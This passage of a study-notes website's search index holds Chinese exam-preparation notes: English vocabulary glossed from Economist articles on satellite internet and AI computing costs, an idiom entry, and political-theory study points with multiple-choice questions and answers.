\u53d1\u9001\uff1b\u4ee5\u6881\u652f\u6491\uff1b\u7528\u2026\u7167\u5c04\uff1b\u6d41\u9732 vi. \u7167\u5c04\uff1b\u5806\u6ee1\u7b11\u5bb9 Eg: Those satellites visible from Schumpeter's garden are the vanguard (\u5148\u950b) of a planned constellation (\u661f\u5ea7) of over 1,000, designed to beam the internet to every corner of the globe. village n. \u6751\u5e84\uff1b\u6751\u6c11\uff1b\uff08\u52a8\u7269\u7684\uff09\u7fa4\u843d rural adj. \u519c\u6751\u7684\uff0c\u4e61\u4e0b\u7684\uff1b\u7530\u56ed\u7684\uff0c\u6709\u4e61\u6751\u98ce\u5473\u7684 Eg: It could serve poorly connected villages in rural Africa (or rural America for that matter), as well as oil rigs or cargo ships at sea. descendant n. \u540e\u88d4\uff0c\u5b50\u5b59\uff1b\uff08\u7531\u8fc7\u53bb\u7c7b\u4f3c\u7269\u53d1\u5c55\u6765\u7684\uff09\u6d3e\u751f\u7269\uff1b\uff08\u673a\u5668\u7b49\uff09\u540e\u7ee7\u578b\u4ea7\u54c1 adj. \u4e0b\u964d\u7684\uff1b\u7956\u4f20\u7684 The first call on its network was between Al Gore, then America's vice-president, and a distant descendant of Alexander Graham Bell. swamp n. \u6cbc\u6cfd\uff0c\u4f4e\u5730\uff0c\u6c34\u6d3c\uff1b\u6e7f\u5730\uff1b\uff08\u7528\u4e8e\u5f3a\u8c03\uff09\u67d0\u5730\u7684\u6d78\u6c34\u7a0b\u5ea6\uff1b\u8fdb\u9000\u4e24\u96be\u7684\u56f0\u5883 v. \u4f7f\u4e0d\u582a\u627f\u53d7\uff0c\u4f7f\u75b2\u4e8e\u5e94\u5bf9\uff0c\u4f7f\u5e94\u63a5\u4e0d\u6687\uff1b\u6df9\uff0c\u6df9\u6ca1\uff1b\uff08\u8239\uff09\u88ab\u6c34\u541e\u6ca1\uff0c\u6c89\u6ca1\uff1b\u4f7f\u9677\u5165\u56f0\u5883 Eg: Nine months later the firm went bust, swamped by th upfront capital costs of launching satellites. sophisticated adj. \u590d\u6742\u7684\uff1b\u7cbe\u81f4\u7684\uff1b\u4e45\u7ecf\u4e16\u6545\u7684\uff1b\u5bcc\u6709\u7ecf\u9a8c\u7684 v. \u4f7f\u53d8\u5f97\u4e16\u6545\uff1b\u4f7f\u8ff7\u60d1\uff1b\u7be1\u6539\uff08sophisticate\u7684\u8fc7\u53bb\u5206\u8bcd\u5f62\u5f0f\uff09 Britain has long tried to nurture its small but sophisticated space sector and OneWeb is notionally a British firm. dubious adj. \u53ef\u7591\u7684\uff1b\u66a7\u6627\u7684\uff1b\u65e0\u628a\u63e1\u7684\uff1b\u534a\u4fe1\u534a\u7591\u7684 Eg: A bombastic (\u6d6e\u5938\u7684) promise to build an al-British replacement, at a cost of \uffe15bn($6.3bn) or more, looks dubious . spur n. \u9a6c\u523a\uff1b\u97ad\u7b56\uff1b\u5c71\u5634\uff1b\uff08\u516c\u8def\u6216\u94c1\u8def\u7684\uff09\u652f\u7ebf\uff1b\u9aa8\u523a v. \u7528\u8e22\u9a6c\u523a\u9a71\u9a6c\u524d\u8fdb\uff1b\u6fc0\u52b1\uff1b\u4fc3\u8fdb\uff1b\u7d27\u8d34\u4e3b\u5e72\u526a\u77ed\uff08\u526f\u68a2\uff09 monopoly n. \u5784\u65ad\uff1b\u5784\u65ad\u8005\uff1b\u4e13\u5356\u6743 Eg: In the meantime, competition from OneWeb would spur innovation and prevent SpaceX from settling into a celestial monopoly . entrepreneur n. \u4f01\u4e1a\u5bb6\uff1b\u627f\u5305\u4eba\uff1b\u4e3b\u529e\u8005 \u5f62\u5bb9\u8bcd\uff1a entrepreneurial adj. \u4f01\u4e1a\u5bb6\u7684\uff0c\u521b\u4e1a\u8005\u7684\uff1b\u4e2d\u95f4\u5546\u7684 Eg: The politest description of its entrepreneurial record is \"spotty\" -- just ask owner of clunkers (\u7834\u8f66) such as an Austin Allegro or Morris Marina, produced after the partial nationalisation (\u56fd\u6709\u5316) in 1968 of British Leyland. keep (one) on (one's) toes (\u4f7f\uff09\u4fdd\u6301\u8b66\u60d5\uff1b\u96c6\u4e2d\u6ce8\u610f\u529b To force someone to stay active, alert, and focused on something or someone. Eg: But if OneWeb keeps Mr Musk on his toes even for a little while, their loss may turn out to be global consumers' gain.","title":"2.2. The battle for low-Earth orbit"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%95%86%E8%AE%BA/2020_July/#3-technology","text":"","title":"3. Technology"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%95%86%E8%AE%BA/2020_July/#31-maching-learning","text":"Summary The cost to train an AI model is rising rapidly in recent years. KPMG reckons the market for specialized AI chips, which is more effective in training AI, worth around $10bn, and could reach $80bn by 2025. With Moore's law's failing, existing computing power may not satisfy the booming needs of AI.However, there are two solutions to solve it, Quantum computing and biology computing technologies. Vocabulary balloon vi. \u6fc0\u589e\uff1b\u81a8\u80c0\u5982\u6c14\u7403 n. \u6c14\u7403 vt. \u4f7f\u50cf\u6c14\u7403\u822c\u9f13\u8d77\uff1b\u4f7f\u6fc0\u589e adj. \u50cf\u6c14\u7403\u822c\u9f13\u8d77\u7684 Eg: A combination of ballooning complexity and competition means costs at the cutting edge are rising sharply. fold vt. \u6298\u53e0\uff1b\u5408\u62e2\uff1b\u62b1\u4f4f\uff1b\u7b3c\u7f69 n. \u6298\u75d5\uff1b\u7f8a\u680f\uff1b\u4fe1\u5f92 vi. \u5f7b\u5e95\u5931\u8d25\uff1b\u6298\u53e0\u8d77\u6765 Eg: By 2018, the computer power used to train big models had risen 300,000-fold , and was doubling every three and a half months. scarce adj. \u7f3a\u4e4f\u7684, \u7f55\u89c1\u7684 Eg: Deep and steep Computing power used in training AI systems are scarce . flush vt. & vi. \u51b2\u5237, \u6e05\u9664 \u9762\u7ea2\u8033\u8d64; (\u4f7f)\u8138\u7ea2 adj. \u9f50\u5e73\u7684, \u540c\u9ad8\u7684 (\u5c24\u6307\u94b1)\u5145\u88d5\u7684, \u5bcc\u88d5\u7684 n. \u51b2\u6d17, \u6e05\u6d17 \u8138\u7ea2; \u6fc0\u52a8; \u559c\u60a6 pinch vt. \u634f\uff1b\u52d2\u7d22\uff1b\u4f7f\u82e6\u607c\uff1b\u6390\u6389\u67d0\u7269\uff0c\u4fee\u526a n. \u532e\u4e4f\uff1b\u5c11\u91cf\uff1b\u5939\u75db vi. \u5939\u75db\uff1b\u8282\u7701 Eg: Those less flush with cash are feeling the pinch . \u90a3\u4e9b\u73b0\u91d1\u6ca1\u90a3\u4e48\u5145\u88d5\u7684\u516c\u53f8\u5c31\u611f\u5230\u8089\u75db\u4e86\u3002 chip n. \u788e\u7247 \u7f3a\u53e3 \u70b8\u9a6c\u94c3\u85af\u6761 \u96c6\u6210\u7535\u8def\u7247 vt. & vi. (\u4f7f)\u5207\u6389\u788e\u7247 Eg: The growing demand for computing power has fuelled a boom in chip design and specialized devices that can perform the calculations used in AI ef\ufb01ciently. reckon vt. \u731c\u60f3; \u4f30\u8ba1 \u3008\u975e\u6b63\u3009\u601d\u5fd6; \u8bbe\u60f3 \u8003\u8651; \u8ba4\u4e3a \u3008\u6b63\u3009\u8ba1\u7b97 Eg: Alfonso Marone at KPMG reckons the market for specialized AI chips is already worth around $10bn, and could reach $80bn by 2025. opine vt. \u4ee5\u4e3a\uff1b\u60f3 vi. \u4ee5\u4e3a\uff1b\u60f3\uff1b\u8868\u793a\u610f\u89c1 Eg: Last year Jensen Huang, Nvidia's founder, opined bluntly that \"Moore's law isn\u2019t possible any more\". exotic adj. \u7531\u5916\u56fd\u5f15\u8fdb\u7684, \u975e\u672c\u5730\u7684 \u5947\u5f02\u7684, \u9192\u76ee\u7684, \u5438\u5f15\u4eba\u7684 Eg: Other researchers are therefore looking at more exotic ideas. brute adj. \u65e0\u7406\u6027\u7684\uff1b\u6b8b\u5fcd\u7684 n. \u755c\u751f\uff1b\u6b8b\u66b4\u7684\u4eba Eg: Another idea is to take inspiration from biology, which proves that current brute\u2014force (\u66b4\u529b\u7834\u89e3) approaches are not the only way. foresee vt. \u9884\u77e5\uff1b\u9884\u89c1 \u5f62\u5bb9\u8bcd\uff1a foreseeable Eg: That means that, for the foreseeable future, AI researchers will have to squeeze every drop of performance from existing computing technologies. analogy n. \u7c7b\u4f3c, \u76f8\u4f3c \u7c7b\u63a8, \u7c7b\u63a8\u6cd5 Eg: To quantify the nascent \ufb01eld's progress, he offers an analogy with video games: \"We're past Pong,\u201d he says. intuitive adj. \u6709\u76f4\u89c9\u529b\u7684;\u51ed\u76f4\u89c9\u83b7\u77e5\u7684 counter n. \u67dc\u53f0, \u67dc\u53f0\u5f0f\u957f\u684c \u8ba1\u6570\u5668 vt. & vi. \u5bf9\u6297, \u53cd\u9a73 adv. \u53cd\u65b9\u5411\u5730, \u5bf9\u7acb\u5730 Eg: One is quantum computing, which uses the counter-intuitive (adj. \u53cd\u76f4\u89c9\u7684\uff1b\u8fdd\u53cd\u8bed\u611f\u7684) properties of quantum mechanics to provide big speed-ups for some sorts of computation. diameter n. \u76f4\u5f84 \u653e\u5927\u7387 Eg: Chips are usually made in batches, with dozens or hundreds etched onto standard silicon wafers 300mm in diameter .","title":"3.1. Maching, learning"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%AD%A6%E4%BA%BA%E4%B9%A0%E8%AF%AD/Economist_2020/","text":"Economist 2020 \u5b66\u4eba\u4e60\u8bed # \u76ee\u5f55 # Economist 2020 \u5b66\u4eba\u4e60\u8bed \u76ee\u5f55 1. Week 29 1.1. \u7b2c149\u671f 1. Week 29 # 1.1. \u7b2c149\u671f # \u4e60\u8bed\uff1a Point the finger \u4f8b\u53e5\uff1a Yet CEOs say the job has got harder. Most point the finger at \"disruption\", the idea that competition is more intense. \u4f46CEO\u4eec\u8bf4\u8fd9\u4efd\u5de5\u4f5c\u8d8a\u6765\u8d8a\u96be\u505a\u4e86\u3002\u4ed6\u4eec\u5927\u591a\u5c06\u77db\u5934\u6307\u5411\u4e86\u201c\u98a0\u8986\u201d---\u610f\u6307\u7ade\u4e89\u6108\u53d1\u6fc0\u70c8\u4e86\u3002 \u51fa\u5904\uff1a \u300a\u7ecf\u6d4e\u5b66\u4eba-\u5546\u8bba\u300b2020\u5e742\u6708\u520a\u7684\u300a\u4f1a\u4f1a\u65b0\u8001\u677f\u300b(Meet the new boss)\u3002 \u89e3\u8bfb\uff1a \u8be5\u4e60\u8bed\u6765\u5386\u597d\u731c\uff0c\u4f7f\u7528\u7b80\u5355\u7075\u6d3b\uff0c\u53ef\u4ee5\u5c06 the \u66ff\u6362\u6210 a \uff0c\u66f4\u53ef\u4ee5\u52a0\u4e0a\u4ecb\u8bcd at \u5f15\u51fa\u5177\u4f53\u7684\u5bf9\u8c61\u3002","title":"Economist 2020"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%AD%A6%E4%BA%BA%E4%B9%A0%E8%AF%AD/Economist_2020/#economist-2020","text":"","title":"Economist 2020 \u5b66\u4eba\u4e60\u8bed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%AD%A6%E4%BA%BA%E4%B9%A0%E8%AF%AD/Economist_2020/#_1","text":"Economist 2020 \u5b66\u4eba\u4e60\u8bed \u76ee\u5f55 1. Week 29 1.1. \u7b2c149\u671f","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%AD%A6%E4%BA%BA%E4%B9%A0%E8%AF%AD/Economist_2020/#1-week-29","text":"","title":"1. Week 29"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%AD%A6%E4%BA%BA%E4%B9%A0%E8%AF%AD/Economist_2020/#11-149","text":"\u4e60\u8bed\uff1a Point the finger \u4f8b\u53e5\uff1a Yet CEOs say the job has got harder. Most point the finger at \"disruption\", the idea that competition is more intense. \u4f46CEO\u4eec\u8bf4\u8fd9\u4efd\u5de5\u4f5c\u8d8a\u6765\u8d8a\u96be\u505a\u4e86\u3002\u4ed6\u4eec\u5927\u591a\u5c06\u77db\u5934\u6307\u5411\u4e86\u201c\u98a0\u8986\u201d---\u610f\u6307\u7ade\u4e89\u6108\u53d1\u6fc0\u70c8\u4e86\u3002 \u51fa\u5904\uff1a \u300a\u7ecf\u6d4e\u5b66\u4eba-\u5546\u8bba\u300b2020\u5e742\u6708\u520a\u7684\u300a\u4f1a\u4f1a\u65b0\u8001\u677f\u300b(Meet the new boss)\u3002 \u89e3\u8bfb\uff1a \u8be5\u4e60\u8bed\u6765\u5386\u597d\u731c\uff0c\u4f7f\u7528\u7b80\u5355\u7075\u6d3b\uff0c\u53ef\u4ee5\u5c06 the \u66ff\u6362\u6210 a \uff0c\u66f4\u53ef\u4ee5\u52a0\u4e0a\u4ecb\u8bcd at \u5f15\u51fa\u5177\u4f53\u7684\u5bf9\u8c61\u3002","title":"1.1. \u7b2c149\u671f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/","text":"\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e00\u5b63 # \u76ee\u5f55 # \u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e00\u5b63 \u76ee\u5f55 1. \u7b2c\u4e00\u5468 1.1. \u7231\u56fd\u4e3b\u4e49\u7684\u57fa\u672c\u5185\u6db5 1.2. \u4e2d\u56fd\u5171\u4ea7\u515a\u514b\u654c\u5236\u80dc\u7684\u4e09\u5927\u6cd5\u5b9d 1.3. \u6587\u5316\u5f3a\u56fd 1.4. \u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a 1.5. \u8fa9\u8bc1\u6cd5\u7684\u4e24\u5927\u7279\u5f81 1.6. \u5168\u9762\u6df1\u5316\u6539\u9769\u7684\u603b\u76ee\u6807 1.7. \u4e60\u8fd1\u5e73\u65b0\u65f6\u4ee3\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u601d\u60f3 2. \u7b2c\u4e8c\u5468 2.1. \u4f9b\u7ed9\u4fa7\u7ed3\u6784\u6027\u6539\u9769 2.2. \u5546\u54c1\u7684\u542b\u4e49 2.3. \u6bdb\u6cfd\u4e1c\u601d\u60f3\u6d3b\u7684\u7075\u9b42 2.4. \u79d1\u5b66\u9ad8\u5c1a\u7684\u4eba\u751f\u89c2 2.5. \u5f62\u800c\u4e0a\u5b66 2.6. \u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316 2.7. \u4e94\u5927\u53d1\u5c55\u7406\u5ff5 3. \u7b2c\u4e09\u5468 3.1. \u4f9d\u6cd5\u6cbb\u56fd\u3001\u4ee5\u5fb7\u6cbb\u56fd 3.2. \u552f\u7269\u4e3b\u4e49\u548c\u552f\u5fc3\u4e3b\u4e49 3.3. \u8fd1\u4ee3\u4e2d\u56fd\u7684\u4e3b\u8981\u77db\u76fe\u548c\u4e3b\u8981\u4efb\u52a1 3.4. \u5b9e\u8df5\u548c\u8ba4\u8bc6\u7684\u5173\u7cfb 3.5. \u804c\u4e1a\u9053\u5fb7\u548c\u516c\u5171\u9053\u5fb7 3.6. \u4e2d\u56fd\u7cbe\u795e 3.7. \u8f9b\u4ea5\u9769\u547d 3.8. \u793e\u4f1a\u5b58\u5728\u548c\u793e\u4f1a\u610f\u8bc6 4. \u7b2c\u56db\u5468 4.1. \u65b0\u6c11\u4e3b\u4e3b\u4e49\u793e\u4f1a\u7684\u9636\u7ea7\u6784\u6210 4.2. \u4e24\u4e2a\u4e00\u767e\u5e74\u548c\u4e24\u6b65\u8d70 4.3. \u5b9e\u8df5\u7684\u6982\u5ff5\u548c\u57fa\u672c\u7ed3\u6784 4.4. \u5b9e\u8df5\u7684\u57fa\u672c\u7c7b\u578b 4.5. \u5b9e\u8df5\u7684\u57fa\u672c\u7279\u5f81 4.6. \u771f\u7406\u4e0e\u4ef7\u503c 4.7. \u5546\u54c1\u7ecf\u6d4e\u7684\u57fa\u672c\u77db\u76fe 4.8. \u515a\u6210\u7acb\u7684\u4f1f\u5927\u610f\u4e49 1. \u7b2c\u4e00\u5468 # 1.1. \u7231\u56fd\u4e3b\u4e49\u7684\u57fa\u672c\u5185\u6db5 # \u2460 \u70ed\u7231\u7956\u56fd\u7684\u5927\u597d\u6cb3\u5c71 \u2461 \u70ed\u7231\u7956\u56fd\u7684\u9aa8\u8089\u540c\u80de \u2462 \u70ed\u7231\u7956\u56fd\u7684\u707f\u70c2\u6587\u5316 \u2463 \u70ed\u7231\u81ea\u5df1\u7684\u56fd\u5bb6 \u94fe\u63a5\u70ed\u70b9\uff1a\u75ab\u60c5\u9632\u63a7 1.2. \u4e2d\u56fd\u5171\u4ea7\u515a\u514b\u654c\u5236\u80dc\u7684\u4e09\u5927\u6cd5\u5b9d # \u2460 \u7edf\u4e00\u6218\u7ebf \uff08\u6218\uff09 \u2461 \u6b66\u88c5\u6597\u4e89 \uff08\u6597\uff09 \u2462 \u515a\u7684\u5efa\u8bbe \uff08\u515a\uff09 1.3. \u6587\u5316\u5f3a\u56fd # \u6211\u4eec\u5f97\u4ece\u4e24\u4e2a\u65b9\u9762\u6765\u5efa\u8bbe\uff0c\u4e00\u4e2a\u53eb\u6587\u5316\u4e8b\u4e1a\uff0c\u4e00\u4e2a\u53eb\u6587\u5316\u4ea7\u4e1a\u3002 \u6587\u5316\u4e8b\u4e1a\uff1a\uff08\u56fe\u4e66\u9986\uff09 \u4e3b\u8981\u4ee5\u653f\u5e9c\u4e3b\u5bfc\uff0c\u8981\u6ce8\u91cd\u516c\u76ca\u6027\u3001\u57fa\u672c\u6027\u3001\u5747\u7b49\u6027\u3001\u4fbf\u5229\u6027\uff0c\u53e6\u5916\u8fd8\u8981\u6ee1\u8db3\u4eba\u6c11\u57fa\u672c\u6587\u5316\u751f\u6d3b\u9700\u8981\u3002 \u6587\u5316\u4ea7\u4e1a\uff1a\uff08\u7535\u5f71\u9662\uff09 \u4e3b\u8981\u4ee5\u5e02\u573a\u4e3a\u4e3b\u5bfc\uff0c\u672a\u6765\u8981\u6210\u4e3a\u6211\u56fd\u7684\u7ecf\u6d4e\u652f\u67f1\uff0c\u6ee1\u8db3\u4eba\u4eec\u66f4\u9ad8\u5c42\u6b21\uff0c\u66f4\u591a\u7684\u6587\u5316\u751f\u6d3b\u9700\u8981\u3002 1.4. \u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a # \"\u5c0f\u5eb7\"\u8bb2\u7684\u662f\u53d1\u5c55\u6c34\u5e73 \"\u5168\u9762\"\u8bb2\u7684\u662f\u53d1\u5c55\u7684\u5e73\u8861\u6027\u3001\u534f\u8c03\u6027\u3001\u53ef\u6301\u7eed\u6027 \u5168\u9762\u5efa\u8bbe\u5c0f\u5eb7\u793e\u4f1a\uff0c\u66f4\u91cd\u8981\uff0c\u66f4\u96be\u505a\u5230\u7684\u662f\"\u5168\u9762\"\u3002\u5982\u671f\u5168\u9762\u5efa\u8bbe\u5c0f\u5eb7\u793e\u4f1a\uff0c\u65e2\u575a\u6301\u4e00\u5b9a\u6807\u51c6\uff0c\u53c8\u9632\u6b62\u597d\u9ad8\u9a9b\u8fdc\uff0c\u65e2\u8003\u8651\u52302020\u5e74\u8fd9\u4e2a\u65f6\u95f4\u8282\u70b9 \uff0c\u53c8\u7acb\u8db3\u4e8e\u6253\u57fa\u7840\u3001\u8c0b\u957f\u8fdc\u3001\u89c1\u6210\u6548\u3002 1.5. \u8fa9\u8bc1\u6cd5\u7684\u4e24\u5927\u7279\u5f81 # \u8054\u7cfb\u4e0e\u53d1\u5c55 \u8054\u7cfb\u5177\u6709\u56db\u5927\u7279\u70b9\uff1a \u5ba2\u89c2\u6027\u3001\u666e\u904d\u6027\u3001\u591a\u6837\u6027\u3001\u6761\u4ef6\u6027 \u53d1\u5c55\uff1a \u957f\u6c5f\u540e\u6d6a\u63a8\u524d\u6d6a\uff0c\u4e00\u6d6a\u8981\u6bd4\u4e00\u6d6a\u6d6a \u957f\u6c5f\u540e\u6d6a\u63a8\u524d\u6d6a\uff0c\u524d\u6d6a\u4e00\u5b9a\u4f1a\u6b7b\u5728\u6c99\u6ee9\u4e0a \u8fd9\u4e2a\u4e16\u754c\u4e0d\u662f\u65e2\u6210\u4e8b\u7269\u7684\u96c6\u5408\u4f53\uff0c\u800c\u662f\u8fc7\u7a0b\u7684\u96c6\u5408\u4f53 \u3010\u591a\u9009\u30112017\u5e746\u6708\uff0c\u6211\u56fd\u79d1\u5b66\u5bb6\u5229\u7528\u201c\u58a8\u5b50\u53f7\u201d\u91cf\u5b50\u79d1\u5b66\u5b9e\u9a8c\u536b\u661f\u5728\u56fd\u9645\u4e0a\u7387\u5148\u6210\u529f\u5b9e\u73b0\u4e86\u5343\u516c\u91cc\u7ea7\u7684\u661f\u5730\u53cc\u5411\u91cf\u5b50\u7ea0\u7f20\u5206\u53d1\u3002\u201c\u91cf\u5b50\u7ea0\u7f20\u201d\u5c31\u662f\u4e24\u4e2a\uff08\u6216\u591a\u4e2a\uff09\u7c92\u5b50\u5171\u540c\u7ec4\u6210\u7684\u91cf\u5b50\u72b6\u6001\uff0c\u65e0\u8bba\u7c92\u5b50\u4e4b\u95f4\u76f8\u9694\u591a\u8fdc\uff0c\u6d4b\u91cf\u5176\u4e2d\u4e00\u4e2a\u7c92\u5b50\u5fc5\u7136\u4f1a\u5f71\u54cd\u5176\u4ed6\u7c92\u5b50\u3002\u201c\u91cf\u5b50\u7ea0\u7f20\u201d\u73b0\u8c61\u867d\u7136\u672a\u88ab\u5b8c\u5168\u8ba4\u77e5\uff0c\u4f46\u5b83\u4ecd\u7136\u80fd\u591f\u8bf4\u660e \uff21\uff0e\u4e16\u754c\u7684\u771f\u6b63\u7edf\u4e00\u6027\u5728\u4e8e\u5b83\u7684\u7269\u8d28\u6027 \uff22\uff0e\u4e8b\u7269\u8054\u7cfb\u7684\u4e3b\u89c2\u6027\u548c\u5076\u7136\u6027 \uff23\uff0e\u4e8b\u7269\u8054\u7cfb\u7684\u590d\u6742\u6027\u548c\u591a\u6837\u6027 \uff24\uff0e\u7269\u8d28\u4e16\u754c\u8054\u7cfb\u7684\u5ba2\u89c2\u6027\u548c\u666e\u904d\u6027 \u7b54\u6848 $$ACD$$ \u3010\u591a\u9009\u3011\u201c\u6c89\u821f\u4fa7\u7554\u5343\u5e06\u8fc7\uff0c\u75c5\u6811\u524d\u5934\u4e07\u6728\u6625\u3002\u201c\u8fa9\u8bc1\u6cd5\u8ba4\u4e3a\u53d1\u5c55\u7684\u5b9e\u8d28\u662f\u65b0\u4e8b\u7269\u7684\u4ea7\u751f\u548c\u65e7\u4e8b\u7269\u7684\u706d\u4ea1\u3002\u65b0\u751f\u4e8b\u7269\u5fc5\u7136\u53d6\u4ee3\u65e7\u4e8b\u7269\uff0c\u4ece\u6839\u672c\u4e0a\u8bf4\uff0c\u662f\u56e0\u4e3a \uff21\uff0e\u65b0\u751f\u4e8b\u7269\u4ea7\u751f\u4e8e\u65e7\u4e8b\u7269\u4e4b\u540e\uff0c\u662f\u65b0\u51fa\u73b0\u7684\u4e8b\u7269 \uff22\uff0e\u65b0\u751f\u4e8b\u7269\u5177\u6709\u65b0\u7684\u7ed3\u6784\u548c\u529f\u80fd\uff0c\u80fd\u9002\u5e94\u5df2\u7ecf\u53d8\u5316\u4e86\u7684\u73af\u5883\u548c\u6761\u4ef6 \uff23\uff0e\u65b0\u751f\u4e8b\u7269\u662f\u5bf9\u65e7\u4e8b\u7269\u7684\u626c\u5f03\uff0c\u5e76\u6dfb\u52a0\u4e86\u65e7\u4e8b\u7269\u6240\u4e0d\u80fd\u5bb9\u7eb3\u7684\u65b0\u5185\u5bb9 \uff24\uff0e\u5728\u793e\u4f1a\u5386\u53f2\u9886\u57df\u5185\uff0c\u65b0\u751f\u4e8b\u7269\u7b26\u5408\u5e7f\u5927\u4eba\u6c11\u7fa4\u4f17\u7684\u6839\u672c\u5229\u76ca\u548c\u8981\u6c42 \u7b54\u6848 $$BCD$$ 1.6. \u5168\u9762\u6df1\u5316\u6539\u9769\u7684\u603b\u76ee\u6807 # \u2460\u575a\u6301\u548c\u53d1\u5c55\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u5236\u5ea6 \u2461\u63a8\u8fdb\u56fd\u5bb6\u6cbb\u7406\u4f53\u7cfb\u3001\u6cbb\u7406\u80fd\u529b\u7684\u73b0\u4ee3\u5316 1.7. \u4e60\u8fd1\u5e73\u65b0\u65f6\u4ee3\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u601d\u60f3 # \u6838\u5fc3\u662f\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u9700\u8981\u8003\u8651\u4e24\u4e2a\u65b9\u9762\u7684\u95ee\u9898\uff1a \u601d\u60f3\u5c42\u9762\uff1a\u6211\u4eec\u8981\u575a\u6301\u53d1\u5c55\u4ec0\u4e48\u6837\u7684\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\uff1b \u884c\u52a8\u5c42\u9762\uff1a\u6211\u4eec\u8981\u600e\u6837\u575a\u6301\u548c\u53d1\u5c55\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u3002 \u3010\u5355\u9009\u3011\u4e60\u8fd1\u5e73\u65b0\u65f6\u4ee3\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u601d\u60f3\u662f\u5bf9\u9a6c\u514b\u601d\u5217\u5b81\u4e3b\u4e49\u3001\u6bdb\u6cfd\u4e1c\u601d\u60f3\u3001\u9093\u5c0f\u5e73\u7406\u8bba\u3001\u201c\u4e09\u4e2a\u4ee3\u8868\u201d\u91cd\u8981\u601d\u60f3\u3001\u79d1\u5b66\u53d1\u5c55\u89c2\u7684\u7ee7\u627f\u548c\u53d1\u5c55\uff0c\u662f\u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316\u6700\u65b0\u6210\u679c\uff0c\u662f\u515a\u548c\u4eba\u6c11\u5b9e\u8df5\u7ecf\u9a8c\u548c\u96c6\u4f53\u667a\u6167\u7684\u7ed3\u6676\uff0c\u662f\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u7406\u8bba\u4f53\u7cfb\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\uff0c\u662f\u5168\u515a\u5168\u56fd\u4eba\u6c11\u4e3a\u5b9e\u73b0\u4e2d\u534e\u6c11\u65cf\u4f1f\u5927\u590d\u5174\u800c\u594b\u6597\u7684\u884c\u52a8\u6307\u5357\u3002\u8fd9\u4e00\u601d\u60f3\u7684\u6838\u5fc3\u8981\u4e49\u662f A\uff0e\u63a8\u8fdb\u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316\u65f6\u4ee3\u5316\u5927\u4f17\u5316 B\uff0e\u5b9e\u73b0\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316 C\uff0e\u575a\u6301\u548c\u53d1\u5c55\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49 D\uff0e\u575a\u6301\u4ee5\u7ecf\u6d4e\u5efa\u8bbe\u4e3a\u4e2d\u5fc3 \u7b54\u6848 $$C$$ \u6613\u9519\u9009D 2. \u7b2c\u4e8c\u5468 # 2.1. \u4f9b\u7ed9\u4fa7\u7ed3\u6784\u6027\u6539\u9769 # \u4f9b\u7ed9\u4fa7\u4e0e\u9700\u6c42\u4fa7\u662f\u4e00\u7ec4\u77db\u76fe\u3002 \u4f9b\u7ed9\u4fa7\u7684\u6839\u672c\u76ee\u7684\u662f\u4e3a\u4e86\u6ee1\u8db3\u4eba\u6c11\u7684\u9700\u8981\u3002 \u6211\u4eec\u8981\u53d1\u5c55\u5b9e\u4f53\u7ecf\u6d4e\uff1b\u8981\u4ece\u4ee5\u4ef7\u53d6\u80dc\u8f6c\u53d8\u4e3a\u4ee5\u8d28\u53d6\u80dc\uff1b\u8981\u52a0\u5927\u4eba\u624d\u7684\u57f9\u80b2\u529b\u5ea6\uff1b\u8981\u505a\u5230\u4e09\u53bb\u4e00\u964d\u4e00\u8865\u3002 \u3010\u5355\u9009\u3011\u5728\u5f53\u524d\u548c\u4eca\u540e\u4e00\u4e2a\u65f6\u671f\uff0c\u6211\u56fd\u7ecf\u6d4e\u53d1\u5c55\u9762\u4e34\u7684\u95ee\u9898\uff0c\u4f9b\u7ed9\u548c\u9700\u6c42\u4e24\u4fa7\u90fd\u6709\uff0c\u4f46\u77db\u76fe\u7684\u4e3b\u8981\u65b9\u9762\u5728 A.\u4f9b\u7ed9\u4fa7 B.\u9700\u6c42\u4fa7 